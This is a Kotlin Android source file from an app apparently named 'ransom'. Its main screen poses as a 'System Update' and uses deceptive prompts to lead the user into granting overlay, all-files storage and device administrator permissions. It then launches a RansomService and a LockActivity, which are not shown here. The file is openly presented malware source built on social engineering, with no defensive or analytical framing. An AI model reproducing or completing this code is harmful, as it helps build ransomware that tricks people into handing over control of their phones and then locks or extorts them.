package com.bos.ransom

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
        }

        val tv = TextView(this).apply {
            text = "System Update\n\nTap untuk install."
            textSize = 16f
        }

        val btn = Button(this).apply {
            text = "Install"
            setOnClickListener {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                    !Settings.canDrawOverlays(this@MainActivity)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")))
                    return@setOnClickListener
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                    !android.os.Environment.isExternalStorageManager()) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                    return@setOnClickListener
                }
                
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this@MainActivity, AdminReceiver::class.java)
                if (!dpm.isAdminActive(admin)) {
                    startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Aktifkan untuk melanjutkan update sistem.")
                    })
                } else {
                    startService(Intent(this@MainActivity, RansomService::class.java))
                    startActivity(Intent(this@MainActivity, LockActivity::class.java))
                    finish()
                }
            }
        }

        layout.addView(tv)
        layout.addView(btn)
        setContentView(layout)
    }
}
